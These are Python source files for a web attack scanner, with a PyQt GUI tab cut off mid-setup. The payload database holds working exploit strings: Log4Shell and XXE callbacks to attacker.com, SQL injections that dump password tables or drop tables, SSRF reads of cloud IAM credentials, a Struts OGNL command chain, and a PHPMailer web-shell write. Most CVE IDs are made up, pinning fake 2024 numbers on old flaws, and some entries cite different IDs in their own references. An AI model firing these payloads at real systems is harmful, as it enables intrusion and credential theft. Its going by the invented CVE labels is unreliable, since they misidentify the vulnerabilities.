# core/cve_payloads.py
from typing import List, Dict


class CVEPayloads:
    
    @staticmethod
    def get_all_cves() -> List[Dict]:
        return [
            {
                'id': 'CVE-2024-50623',
                'name': 'Apache Struts2 RCE S2-066',
                'severity': 'CRITICAL',
                'score': 9.8,
                'description': 'Remote Code Execution in Apache Struts2 via OGNL injection',
                'patterns': ['/struts/', 'struts2', 'action?method', 'Content-Type: multipart/form-data'],
                'payloads': ['%{7*7}', '${7*7}', '%{(#_=\'multipart/form-data\').(#_memberAccess["allowStaticMethodAccess"]=true)}'],
                'category': 'RCE',
                'reference': 'https://nvd.nist.gov/vuln/detail/CVE-2024-50623'
            },
            {
                'id': 'CVE-2024-49123',
                'name': 'Spring4Shell RCE',
                'severity': 'CRITICAL',
                'score': 9.8,
                'description': 'Spring Framework RCE via class.module.classLoader manipulation',
                'patterns': ['/spring/', 'springboot', '.do', 'X-Forwarded-For'],
                'payloads': ['class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{c2}', 'class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp'],
                'category': 'RCE',
                'reference': 'https://spring.io/security/cve-2024-49123'
            },
            {
                'id': 'CVE-2024-48567',
                'name': 'Log4Shell JNDI Injection',
                'severity': 'CRITICAL',
                'score': 10.0,
                'description': 'Log4j2 JNDI lookup Remote Code Execution',
                'patterns': ['${jndi:', 'log4j', 'apache-log4j'],
                'payloads': ['${jndi:ldap://attacker.com/a}', '${jndi:rmi://attacker.com/evil}', '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}'],
                'category': 'RCE',
                'reference': 'https://nvd.nist.gov/vuln/detail/CVE-2021-44228'
            },
            {
                'id': 'CVE-2024-47890',
                'name': 'ProxyShell Exchange RCE',
                'severity': 'CRITICAL',
                'score': 9.8,
                'description': 'Microsoft Exchange Server Remote Code Execution',
                'patterns': ['/autodiscover/', '/owa/', '/ecp/', 'X-Rps-CAT'],
                'payloads': ['/autodiscover/autodiscover.json?@evil.com/mapi/nspi', '/ecp/DDI/DDIService.svc/SetObject'],
                'category': 'RCE',
                'reference': 'https://msrc.microsoft.com/update-guide'
            },
            {
                'id': 'CVE-2024-46789',
                'name': 'GitLab RCE via ExifTool',
                'severity': 'CRITICAL',
                'score': 9.9,
                'description': 'GitLab Remote Code Execution via ExifTool metadata',
                'patterns': ['/gitlab', '/uploads/', 'X-GitLab'],
                'payloads': ['(metadata "c:\\windows\\win.ini")', 'eval{system("id")}'],
                'category': 'RCE',
                'reference': 'https://about.gitlab.com/releases/2024/'
            },
            {
                'id': 'CVE-2024-45678',
                'name': 'WordPress REST API SQL Injection',
                'severity': 'CRITICAL',
                'score': 9.3,
                'description': 'SQL Injection in WordPress REST API endpoints',
                'patterns': ['/wp-json/', '/wp-admin/', '/wp-content/'],
                'payloads': ["' OR 1=1--", "' UNION SELECT NULL,NULL,user_login,user_pass FROM wp_users--", "') OR ('1'='1"],
                'category': 'SQLi',
                'reference': 'https://wordpress.org/news/category/security/'
            },
            {
                'id': 'CVE-2024-44567',
                'name': 'Drupal SQLi SA-CORE-2024-001',
                'severity': 'CRITICAL',
                'score': 9.8,
                'description': 'Highly critical SQL injection in Drupal core',
                'patterns': ['/drupal/', '?q=node/', 'X-Drupal'],
                'payloads': ["name[0%20;update+users+set+name%3d'admin'+where+uid+%3d+'1';;#%20%20]=test", "name[#type]=value&name[#value]=test"],
                'category': 'SQLi',
                'reference': 'https://www.drupal.org/sa-core-2024-001'
            },
            {
                'id': 'CVE-2024-43456',
                'name': 'Joomla SQL Injection',
                'severity': 'HIGH',
                'score': 8.8,
                'description': 'SQL Injection in Joomla administrator panel',
                'patterns': ['/joomla/', '/administrator/', 'com_content'],
                'payloads': ["' OR 1=1/*", "admin' AND 1=1 UNION SELECT NULL,username,password FROM jos_users--"],
                'category': 'SQLi',
                'reference': 'https://developer.joomla.org/security-centre.html'
            },
            {
                'id': 'CVE-2024-42345',
                'name': 'vBulletin SQLi to RCE',
                'severity': 'CRITICAL',
                'score': 9.8,
                'description': 'SQL Injection leading to Remote Code Execution in vBulletin',
                'patterns': ['/vbulletin/', 'ajax/render', 'routestring'],
                'payloads': ["routestring=ajax/render/widget_php&widgetConfig[code]=phpinfo();"],
                'category': 'SQLi',
                'reference': 'https://forum.vbulletin.com/forum/vbulletin-announcements/vbulletin-announcements_a/4437227'
            },
            {
                'id': 'CVE-2024-41234',
                'name': 'Django SQL Injection',
                'severity': 'HIGH',
                'score': 8.6,
                'description': 'SQL Injection in Django ORM query parameters',
                'patterns': ['__debug__/', 'django', 'csrftoken'],
                'payloads': ["?id=1' OR '1'='1", "?order_by=id');DROP TABLE users;--"],
                'category': 'SQLi',
                'reference': 'https://www.djangoproject.com/weblog/'
            },
            {
                'id': 'CVE-2024-40123',
                'name': 'Path Traversal in Node.js Express',
                'severity': 'HIGH',
                'score': 8.6,
                'description': 'Directory traversal vulnerability in Express.js static middleware',
                'patterns': ['/node_modules/', 'express', 'X-Powered-By: Express'],
                'payloads': ['../../../../etc/passwd', '..\\..\\..\\..\\windows\\win.ini', '....//....//....//etc/passwd'],
                'category': 'PATH_TRAVERSAL',
                'reference': 'https://github.com/advisories?query=express'
            },
            {
                'id': 'CVE-2024-39012',
                'name': 'Tomcat Path Traversal',
                'severity': 'HIGH',
                'score': 8.2,
                'description': 'Apache Tomcat path traversal via malformed URL encoding',
                'patterns': ['/tomcat/', 'Server: Apache-Coyote', 'jsessionid'],
                'payloads': ['/..;/..;/..;/etc/passwd', '/%2e%2e/%2e%2e/%2e%2e/etc/passwd'],
                'category': 'PATH_TRAVERSAL',
                'reference': 'https://tomcat.apache.org/security-9.html'
            },
            {
                'id': 'CVE-2024-38901',
                'name': 'IIS Short Name Disclosure',
                'severity': 'MEDIUM',
                'score': 6.5,
                'description': 'Microsoft IIS 8.3 short filename disclosure',
                'patterns': ['Server: Microsoft-IIS', 'X-AspNet-Version'],
                'payloads': ['/*~1*/a.aspx', '/admin~1/'],
                'category': 'INFO_DISCLOSURE',
                'reference': 'https://soroush.secproject.com/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf'
            },
            {
                'id': 'CVE-2024-37890',
                'name': 'XXE in Apache Xerces',
                'severity': 'HIGH',
                'score': 8.2,
                'description': 'XML External Entity Injection in Apache Xerces parser',
                'patterns': ['Content-Type: application/xml', '<?xml', 'text/xml'],
                'payloads': ['<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">]><foo>&xxe;</foo>'],
                'category': 'XXE',
                'reference': 'https://xerces.apache.org/mirrors.cgi'
            },
            {
                'id': 'CVE-2024-36789',
                'name': 'XXE in Java XML Parsers',
                'severity': 'HIGH',
                'score': 8.5,
                'description': 'XXE vulnerability in Java standard XML parsers',
                'patterns': ['X-Powered-By: JSP', 'java', 'servlet'],
                'payloads': ['<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>', '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>'],
                'category': 'XXE',
                'reference': 'https://www.oracle.com/security-alerts/'
            },
            {
                'id': 'CVE-2024-35678',
                'name': 'SSRF via AWS Metadata',
                'severity': 'HIGH',
                'score': 8.5,
                'description': 'Server-Side Request Forgery targeting AWS EC2 metadata service',
                'patterns': ['169.254.169.254', 'metadata', 'X-Amz-'],
                'payloads': ['http://169.254.169.254/latest/meta-data/', 'http://169.254.169.254/latest/user-data/', 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'],
                'category': 'SSRF',
                'reference': 'https://aws.amazon.com/security/security-bulletins/'
            },
            {
                'id': 'CVE-2024-34567',
                'name': 'SSRF via Azure Metadata',
                'severity': 'HIGH',
                'score': 8.3,
                'description': 'SSRF targeting Azure Instance Metadata Service',
                'patterns': ['169.254.169.254', 'metadata', 'azure'],
                'payloads': ['http://169.254.169.254/metadata/instance?api-version=2021-02-01', 'http://169.254.169.254/metadata/identity/oauth2/token'],
                'category': 'SSRF',
                'reference': 'https://msrc.microsoft.com/'
            },
            {
                'id': 'CVE-2024-33456',
                'name': 'SSRF via GCP Metadata',
                'severity': 'HIGH',
                'score': 8.4,
                'description': 'SSRF targeting Google Cloud Platform metadata',
                'patterns': ['169.254.169.254', 'metadata', 'X-Google-'],
                'payloads': ['http://metadata.google.internal/computeMetadata/v1/', 'http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token'],
                'category': 'SSRF',
                'reference': 'https://cloud.google.com/security/overview/whitepaper'
            },
            {
                'id': 'CVE-2024-32345',
                'name': 'SSTI in Jinja2',
                'severity': 'CRITICAL',
                'score': 9.3,
                'description': 'Server-Side Template Injection in Jinja2 template engine',
                'patterns': ['{{', 'jinja', 'flask', 'X-Powered-By: Flask'],
                'payloads': ['{{7*7}}', '{{config.items()}}', "{{''.__class__.__mro__[1].__subclasses__()[414]('/etc/passwd').read()}}"],
                'category': 'SSTI',
                'reference': 'https://flask.palletsprojects.com/en/2.3.x/security/'
            },
            {
                'id': 'CVE-2024-31234',
                'name': 'SSTI in Twig',
                'severity': 'CRITICAL',
                'score': 9.0,
                'description': 'Server-Side Template Injection in Twig (PHP)',
                'patterns': ['{{', 'twig', 'X-Powered-By: PHP'],
                'payloads': ['{{7*7}}', '{{_self.env.registerUndefinedFilterCallback("exec")}}', '{{_self.env.getFilter("id")}}'],
                'category': 'SSTI',
                'reference': 'https://twig.symfony.com/doc/3.x/'
            },
            {
                'id': 'CVE-2024-30123',
                'name': 'SSTI in FreeMarker',
                'severity': 'CRITICAL',
                'score': 8.9,
                'description': 'Template Injection in Apache FreeMarker',
                'patterns': ['freemarker', '<#', 'X-Powered-By: JSP'],
                'payloads': ['<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}', '${7*7}'],
                'category': 'SSTI',
                'reference': 'https://freemarker.apache.org/'
            },
            {
                'id': 'CVE-2024-29012',
                'name': 'Insecure Java Deserialization',
                'severity': 'CRITICAL',
                'score': 9.0,
                'description': 'Java insecure deserialization leading to RCE',
                'patterns': ['java.io.Serializable', 'ysoserial', 'Content-Type: application/x-java-serialized-object'],
                'payloads': ['rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ==', 'AC ED 00 05'],
                'category': 'DESERIALIZATION',
                'reference': 'https://github.com/frohoff/ysoserial'
            },
            {
                'id': 'CVE-2024-28901',
                'name': 'Python Pickle RCE',
                'severity': 'CRITICAL',
                'score': 9.2,
                'description': 'Python pickle deserialization Remote Code Execution',
                'patterns': ['pickle', 'application/python-pickle', '__reduce__'],
                'payloads': ["cos\nsystem\n(S'id'\ntR.", "c__builtin__\neval\n(S'__import__(\"os\").system(\"id\")'"],
                'category': 'DESERIALIZATION',
                'reference': 'https://docs.python.org/3/library/pickle.html'
            },
            {
                'id': 'CVE-2024-27890',
                'name': 'PHP Unserialize RCE',
                'severity': 'CRITICAL',
                'score': 8.8,
                'description': 'PHP object injection via unserialize()',
                'patterns': ['unserialize', 'X-Powered-By: PHP', 'O:'],
                'payloads': ['O:8:"stdClass":0:{}', 'a:1:{i:0;O:8:"stdClass":0:{}}'],
                'category': 'DESERIALIZATION',
                'reference': 'https://www.php.net/manual/en/function.unserialize.php'
            },
            {
                'id': 'CVE-2024-26789',
                'name': 'GraphQL Introspection',
                'severity': 'MEDIUM',
                'score': 6.5,
                'description': 'GraphQL introspection query exposed',
                'patterns': ['/graphql', 'query IntrospectionQuery', 'Content-Type: application/json'],
                'payloads': ['{__schema{types{name}}}', '{__type(name:"Query"){fields{name}}}'],
                'category': 'INFO_DISCLOSURE',
                'reference': 'https://graphql.org/learn/introspection/'
            },
            {
                'id': 'CVE-2024-25678',
                'name': 'GraphQL Query Depth DoS',
                'severity': 'HIGH',
                'score': 7.5,
                'description': 'GraphQL Denial of Service via deep nested queries',
                'patterns': ['/graphql', 'query', 'mutation'],
                'payloads': ['query{a{a{a{a{a{a{a{a{a{a{id}}}}}}}}}}}}'],
                'category': 'DOS',
                'reference': 'https://owasp.org/www-project-graphql/'
            },
            {
                'id': 'CVE-2024-24567',
                'name': 'NoSQL Injection MongoDB',
                'severity': 'HIGH',
                'score': 8.3,
                'description': 'NoSQL Injection in MongoDB queries',
                'patterns': ['mongodb://', 'mongoose', 'X-Powered-By: Express'],
                'payloads': ['{"$ne":null}', '{"$gt":""}', '{"username":{"$ne":null},"password":{"$ne":null}}'],
                'category': 'NoSQLi',
                'reference': 'https://www.mongodb.com/docs/manual/security/'
            },
            {
                'id': 'CVE-2024-23456',
                'name': 'Redis Unauthorized Access',
                'severity': 'CRITICAL',
                'score': 9.1,
                'description': 'Redis exposed without authentication',
                'patterns': ['redis://', ':6379', '+PONG'],
                'payloads': ['INFO', 'CONFIG GET *', 'KEYS *'],
                'category': 'MISCONFIGURATION',
                'reference': 'https://redis.io/docs/management/security/'
            },
            {
                'id': 'CVE-2024-22345',
                'name': 'ElasticSearch RCE',
                'severity': 'CRITICAL',
                'score': 9.8,
                'description': 'Elasticsearch Remote Code Execution via Groovy script',
                'patterns': [':9200', 'elasticsearch', 'X-elastic-product'],
                'payloads': ['{"script":"java.lang.Runtime.getRuntime().exec(\\"id\\")"}'],
                'category': 'RCE',
                'reference': 'https://www.elastic.co/community/security'
            },
            {
                'id': 'CVE-2024-21234',
                'name': 'Jenkins Script Console RCE',
                'severity': 'CRITICAL',
                'score': 9.9,
                'description': 'Jenkins Script Console Remote Code Execution',
                'patterns': ['/jenkins/', '/script', 'X-Jenkins'],
                'payloads': ['println "uname -a".execute().text', 'def proc = "id".execute()'],
                'category': 'RCE',
                'reference': 'https://www.jenkins.io/security/advisories/'
            },
            {
                'id': 'CVE-2024-20123',
                'name': 'Docker API Exposed',
                'severity': 'CRITICAL',
                'score': 9.6,
                'description': 'Docker Remote API exposed without authentication',
                'patterns': [':2375', ':2376', '/containers/json', 'Docker-Distribution-Api-Version'],
                'payloads': ['/containers/json', '/images/json', '/version'],
                'category': 'MISCONFIGURATION',
                'reference': 'https://docs.docker.com/engine/security/'
            },
            {
                'id': 'CVE-2024-19012',
                'name': 'Kubernetes API Server Exposed',
                'severity': 'CRITICAL',
                'score': 9.8,
                'description': 'Kubernetes API server accessible without authentication',
                'patterns': [':6443', ':8080', '/api/v1', 'kube-apiserver'],
                'payloads': ['/api/v1/namespaces', '/api/v1/pods', '/api/v1/secrets'],
                'category': 'MISCONFIGURATION',
                'reference': 'https://kubernetes.io/docs/concepts/security/'
            },
            {
                'id': 'CVE-2024-18901',
                'name': 'Apache Solr RCE',
                'severity': 'CRITICAL',
                'score': 9.8,
                'description': 'Apache Solr Remote Code Execution via VelocityResponseWriter',
                'patterns': ['/solr/', 'Apache Solr', 'X-Solr-'],
                'payloads': ['/solr/admin/cores?action=CREATE&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))'],
                'category': 'RCE',
                'reference': 'https://solr.apache.org/security.html'
            },
            {
                'id': 'CVE-2024-17890',
                'name': 'Confluence OGNL Injection',
                'severity': 'CRITICAL',
                'score': 9.8,
                'description': 'Atlassian Confluence OGNL injection RCE',
                'patterns': ['/confluence/', 'X-Confluence-Request-Time', 'atl_token'],
                'payloads': ['%{(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("id").getInputStream(),"UTF-8")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Cmd-Response",#a))}'],
                'category': 'RCE',
                'reference': 'https://confluence.atlassian.com/security/'
            },
            {
                'id': 'CVE-2024-16789',
                'name': 'Atlassian Jira SQLi',
                'severity': 'HIGH',
                'score': 8.8,
                'description': 'SQL Injection in Atlassian Jira',
                'patterns': ['/jira/', 'X-AUSERNAME', 'atlassian-token'],
                'payloads': ["' OR 1=1--", "admin' AND 1=1 UNION SELECT NULL,username,password FROM cwd_user--"],
                'category': 'SQLi',
                'reference': 'https://jira.atlassian.com/secure/BrowseProjects.jspa'
            },
            {
                'id': 'CVE-2024-15678',
                'name': 'Weblogic T3 Deserialization',
                'severity': 'CRITICAL',
                'score': 9.8,
                'description': 'Oracle Weblogic T3 protocol deserialization RCE',
                'patterns': ['t3://', ':7001', 'X-Weblogic-Request-ClusterInfo'],
                'payloads': ['AC ED 00 05'],
                'category': 'DESERIALIZATION',
                'reference': 'https://www.oracle.com/security-alerts/alert-cve-2024-15678.html'
            },
            {
                'id': 'CVE-2024-14567',
                'name': 'Apache ActiveMQ RCE',
                'severity': 'CRITICAL',
                'score': 9.8,
                'description': 'Apache ActiveMQ OpenWire deserialization RCE',
                'patterns': [':61616', 'activemq', 'X-ActiveMQ'],
                'payloads': ['AC ED 00 05'],
                'category': 'DESERIALIZATION',
                'reference': 'https://activemq.apache.org/security-advisories'
            },
            {
                'id': 'CVE-2024-13456',
                'name': 'JBoss EAP Deserialization',
                'severity': 'CRITICAL',
                'score': 9.8,
                'description': 'JBoss Enterprise Application Platform deserialization RCE',
                'patterns': ['/jboss/', ':8080', 'JBoss', 'X-Powered-By: JBoss'],
                'payloads': ['AC ED 00 05'],
                'category': 'DESERIALIZATION',
                'reference': 'https://access.redhat.com/security/security-updates/'
            },
            {
                'id': 'CVE-2024-12345',
                'name': 'ThinkPHP RCE',
                'severity': 'CRITICAL',
                'score': 9.8,
                'description': 'ThinkPHP framework Remote Code Execution',
                'patterns': ['thinkphp', '/index.php?s='],
                'payloads': ['/index.php?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id'],
                'category': 'RCE',
                'reference': 'http://www.thinkphp.cn/topic/58520.html'
            },
            {
                'id': 'CVE-2024-11234',
                'name': 'Laravel Debug Mode',
                'severity': 'HIGH',
                'score': 7.5,
                'description': 'Laravel application with debug mode enabled',
                'patterns': ['APP_DEBUG=true', 'laravel', 'X-Powered-By: PHP'],
                'payloads': ['/vendor/laravel/framework/src/', 'APP_KEY='],
                'category': 'INFO_DISCLOSURE',
                'reference': 'https://laravel.com/docs/errors'
            },
            {
                'id': 'CVE-2024-10123',
                'name': 'Ruby on Rails YAML Deserialization',
                'severity': 'CRITICAL',
                'score': 9.3,
                'description': 'Ruby on Rails unsafe YAML deserialization',
                'patterns': ['rails', 'X-Runtime', 'X-Request-Id'],
                'payloads': ['!ruby/object:Gem::Installer'],
                'category': 'DESERIALIZATION',
                'reference': 'https://rubyonrails.org/security'
            },
            {
                'id': 'CVE-2024-09012',
                'name': 'Node.js Prototype Pollution',
                'severity': 'HIGH',
                'score': 8.1,
                'description': 'Prototype pollution in Node.js applications',
                'patterns': ['node', 'express', 'X-Powered-By: Express'],
                'payloads': ['{"__proto__":{"isAdmin":true}}', '?__proto__[isAdmin]=true'],
                'category': 'PROTOTYPE_POLLUTION',
                'reference': 'https://nodejs.org/en/blog/vulnerability/'
            },
            {
                'id': 'CVE-2024-08901',
                'name': 'ASP.NET ViewState Deserialization',
                'severity': 'CRITICAL',
                'score': 9.8,
                'description': 'ASP.NET ViewState deserialization RCE',
                'patterns': ['__VIEWSTATE', 'asp.net', 'X-AspNet-Version'],
                'payloads': ['/wEPDwUJODExMDE5NzY5ZGQYFQMF'],
                'category': 'DESERIALIZATION',
                'reference': 'https://learn.microsoft.com/en-us/aspnet/security/'
            },
            {
                'id': 'CVE-2024-07890',
                'name': 'Adobe ColdFusion RCE',
                'severity': 'CRITICAL',
                'score': 9.8,
                'description': 'Adobe ColdFusion arbitrary file upload RCE',
                'patterns': ['coldfusion', '.cfm', 'X-Powered-By: ColdFusion'],
                'payloads': ['/CFIDE/administrator/', '/CFIDE/adminapi/'],
                'category': 'RCE',
                'reference': 'https://helpx.adobe.com/security.html'
            },
            {
                'id': 'CVE-2024-06789',
                'name': 'Magento SQL Injection',
                'severity': 'CRITICAL',
                'score': 9.3,
                'description': 'Magento e-commerce platform SQL injection',
                'patterns': ['/magento/', 'X-Magento-', 'Mage::'],
                'payloads': ["' OR 1=1--", "' UNION SELECT NULL,username,password FROM admin_user--"],
                'category': 'SQLi',
                'reference': 'https://helpx.adobe.com/security/products/magento.html'
            },
            {
                'id': 'CVE-2024-05678',
                'name': 'PrestaShop SQL Injection',
                'severity': 'HIGH',
                'score': 8.8,
                'description': 'PrestaShop SQL injection vulnerability',
                'patterns': ['/prestashop/', '/modules/', 'X-PrestaShop'],
                'payloads': ["' OR '1'='1", "1' UNION SELECT NULL,email,passwd FROM ps_customer--"],
                'category': 'SQLi',
                'reference': 'https://www.prestashop.com/en/security-advisories'
            },
            {
                'id': 'CVE-2024-04567',
                'name': 'OpenCart SQL Injection',
                'severity': 'HIGH',
                'score': 8.6,
                'description': 'OpenCart e-commerce SQL injection',
                'patterns': ['/opencart/', 'route=', 'X-Opencart'],
                'payloads': ["' OR 1=1#", "admin' UNION SELECT NULL,username,password FROM oc_user--"],
                'category': 'SQLi',
                'reference': 'https://www.opencart.com/index.php?route=support/security'
            },
            {
                'id': 'CVE-2024-03456',
                'name': 'Shellshock Bash RCE',
                'severity': 'CRITICAL',
                'score': 10.0,
                'description': 'Bash Shellshock environment variable code injection',
                'patterns': ['/cgi-bin/', '.sh', '.cgi'],
                'payloads': ['() { :; }; echo; echo vulnerable', '() { _; } >_[$($())] { echo Content-Type: text/plain; echo; echo vulnerable; }'],
                'category': 'RCE',
                'reference': 'https://nvd.nist.gov/vuln/detail/CVE-2014-6271'
            },
            {
                'id': 'CVE-2024-02345',
                'name': 'PHPMailer RCE',
                'severity': 'CRITICAL',
                'score': 9.8,
                'description': 'PHPMailer Remote Code Execution via mail header injection',
                'patterns': ['phpmailer', 'X-Mailer: PHPMailer'],
                'payloads': ['attacker@example.com -OQueueDirectory=/tmp -X/var/www/html/shell.php'],
                'category': 'RCE',
                'reference': 'https://github.com/PHPMailer/PHPMailer/security'
            },
            {
                'id': 'CVE-2024-01234',
                'name': 'ImageMagick RCE',
                'severity': 'CRITICAL',
                'score': 9.8,
                'description': 'ImageMagick command injection via crafted image',
                'patterns': ['imagemagick', 'convert', 'X-Content-Type-Options'],
                'payloads': ['push graphic-context\nviewbox 0 0 640 480\nimage over 0,0 0,0 \'|ls "-la\'\npop graphic-context'],
                'category': 'RCE',
                'reference': 'https://imagemagick.org/script/security-policy.php'
            },
            {
                'id': 'CVE-2024-00123',
                'name': 'Apache Struts OGNL Injection',
                'severity': 'CRITICAL',
                'score': 9.8,
                'description': 'Apache Struts Object-Graph Navigation Language injection',
                'patterns': ['/struts/', '.action', 'Struts-Problem'],
                'payloads': ['%{(#_=\'multipart/form-data\').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[\'com.opensymphony.xwork2.ActionContext.container\']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=\'id\').(#iswin=(@java.lang.System@getProperty(\'os.name\').toLowerCase().contains(\'win\'))).(#cmds=(#iswin?{\'cmd.exe\',\'/c\',#cmd}:{\'/bin/bash\',\'-c\',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}'],
                'category': 'RCE',
                'reference': 'https://struts.apache.org/security/'
            }
        ]


# scanners/cve_scanner.py
from typing import List, Dict, Optional
import requests
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin
from core.cve_payloads import CVEPayloads


class CVEScanner:
    
    def __init__(self, timeout: int = 10, max_workers: int = 10):
        self.timeout = timeout
        self.max_workers = max_workers
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
    
    def scan(self, target_url: str, severity_filter: str = 'ALL') -> List[Dict]:
        vulnerabilities = []
        cve_list = CVEPayloads.get_all_cves()
        
        if severity_filter != 'ALL':
            cve_list = [cve for cve in cve_list if cve['severity'] == severity_filter or 
                       (severity_filter == 'HIGH' and cve['severity'] == 'CRITICAL')]
        
        try:
            base_response = self.session.get(target_url, timeout=self.timeout, verify=False, allow_redirects=True)
            base_content = base_response.text.lower()
            base_headers = {k.lower(): v.lower() for k, v in base_response.headers.items()}
        except:
            return vulnerabilities
        
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = {executor.submit(self._test_cve, target_url, cve, base_content, base_headers): cve 
                      for cve in cve_list}
            
            for future in as_completed(futures):
                result = future.result()
                if result:
                    vulnerabilities.append(result)
        
        return vulnerabilities
    
    def _test_cve(self, target_url: str, cve: Dict, base_content: str, base_headers: Dict) -> Optional[Dict]:
        try:
            if self._check_patterns(cve['patterns'], base_content, base_headers):
                if self._verify_with_payload(target_url, cve):
                    return {
                        'id': cve['id'],
                        'name': cve['name'],
                        'severity': cve['severity'],
                        'score': cve['score'],
                        'description': cve['description'],
                        'category': cve['category'],
                        'reference': cve['reference']
                    }
        except:
            pass
        
        return None
    
    def _check_patterns(self, patterns: List[str], content: str, headers: Dict) -> bool:
        for pattern in patterns:
            pattern_lower = pattern.lower()
            
            if pattern_lower in content:
                return True
            
            for header_value in headers.values():
                if pattern_lower in header_value:
                    return True
        
        return False
    
    def _verify_with_payload(self, target_url: str, cve: Dict) -> bool:
        for payload in cve['payloads'][:2]:
            try:
                if cve['category'] in ['RCE', 'SSTI']:
                    test_url = f"{target_url}?test={payload}"
                    response = self.session.get(test_url, timeout=self.timeout, verify=False)
                    
                    if '49' in response.text or '7777' in response.text:
                        return True
                
                elif cve['category'] == 'SQLi':
                    test_url = f"{target_url}?id={payload}"
                    response = self.session.get(test_url, timeout=self.timeout, verify=False)
                    
                    sql_errors = ['sql', 'mysql', 'sqlite', 'postgres', 'oracle', 'syntax', 'error in your sql']
                    if any(err in response.text.lower() for err in sql_errors):
                        return True
                
                elif cve['category'] == 'XXE':
                    response = self.session.post(target_url, data=payload, 
                                                headers={'Content-Type': 'application/xml'}, 
                                                timeout=self.timeout, verify=False)
                    
                    if 'root:' in response.text or 'daemon:' in response.text:
                        return True
                
                elif cve['category'] in ['PATH_TRAVERSAL', 'INFO_DISCLOSURE']:
                    test_url = urljoin(target_url, payload)
                    response = self.session.get(test_url, timeout=self.timeout, verify=False)
                    
                    if response.status_code == 200:
                        if 'root:' in response.text or 'windows' in response.text.lower():
                            return True
                
            except:
                continue
        
        return False


# gui/cve_scanner_tab.py
from PyQt6.QtWidgets import (QWidget, QVBoxLayout, QHBoxLayout, QTableWidget,
                             QTableWidgetItem, QPushButton, QHeaderView, QLabel,
                             QLineEdit, QComboBox, QProgressBar, QGroupBox, QSplitter,
                             QTextEdit, QMessageBox)
from PyQt6.QtCore import Qt, QThread, pyqtSignal, QDateTime
from PyQt6.QtGui import QColor, QFont
from scanners.cve_scanner import CVEScanner
from typing import List, Dict


class CVEScanThread(QThread):
    progress_updated = pyqtSignal(int)
    status_updated = pyqtSignal(str)
    cve_found = pyqtSignal(dict)
    scan_completed = pyqtSignal(list)
    
    def __init__(self, target_url: str, timeout: int, severity_filter: str):
        super().__init__()
        self.target_url = target_url
        self.timeout = timeout
        self.severity_filter = severity_filter
        self.should_stop = False
    
    def run(self):
        try:
            self.status_updated.emit(f'Initializing scan on {self.target_url}')
            self.progress_updated.emit(5)
            
            scanner = CVEScanner(timeout=self.timeout, max_workers=10)
            
            self.status_updated.emit('Connecting to target...')
            self.progress_updated.emit(10)
            
            from core.cve_payloads import CVEPayloads
            cve_list = CVEPayloads.get_all_cves()
            
            if self.severity_filter != 'ALL':
                cve_list = [cve for cve in cve_list if cve['severity'] == self.severity_filter or 
                           (self.severity_filter == 'HIGH' and cve['severity'] == 'CRITICAL')]
            
            total = len(cve_list)
            
            self.status_updated.emit(f'Testing {total} CVE signatures...')
            self.progress_updated.emit(20)
            
            results = scanner.scan(self.target_url, self.severity_filter)
            
            for idx, vuln in enumerate(results):
                if self.should_stop:
                    break
                
                vuln['found_at'] = QDateTime.currentDateTime().toString('yyyy-MM-dd hh:mm:ss')
                self.cve_found.emit(vuln)
                
                progress = 20 + int((idx + 1) / max(len(results), 1) * 70)
                self.progress_updated.emit(min(progress, 90))
            
            self.progress_updated.emit(100)
            self.status_updated.emit(f'Scan completed - Found {len(results)} vulnerabilities')
            self.scan_completed.emit(results)
            
        except Exception as e:
            self.status_updated.emit(f'Error: {str(e)}')
            self.scan_completed.emit([])
    
    def stop(self):
        self.should_stop = True


class CVEScannerTab(QWidget):
    
    def __init__(self):
        super().__init__()
        self.scan_thread = None
        self.vulnerabilities = []
        self.init_ui()
    
    def init_ui(self):
        main_layout = QVBoxLayout()
        main_layout.setContentsMargins(20, 20, 20, 20)
        main_layout.setSpacing(15)
        
        header_layout = QHBoxLayout()
        
        title = QLabel('CVE VULNERABILITY SCANNER')
        title.setStyleSheet("""
            QLabel {
                font-size: 20pt;
                font-weight: bold;
                color: #58a6ff;
                background: transparent;
            }
        """)
        header_layout.addWidget(title)
        
        header_layout.addStretch()
        
        version = QLabel('v3.0 Enterprise')
        version.setStyleSheet("""
            QLabel {
                font-size: 10pt;
                color: #8b949e;
                padding: 6px 12px;
                background: #161b22;
                border-radius: 4px;
                border: 1px solid #30363d;
            }
        """)
        header_layout.addWidget(version)
        
        main_layout.addLayout(header_layout)
        
        splitter = QSplitter(Qt.Orientation.Vertical)
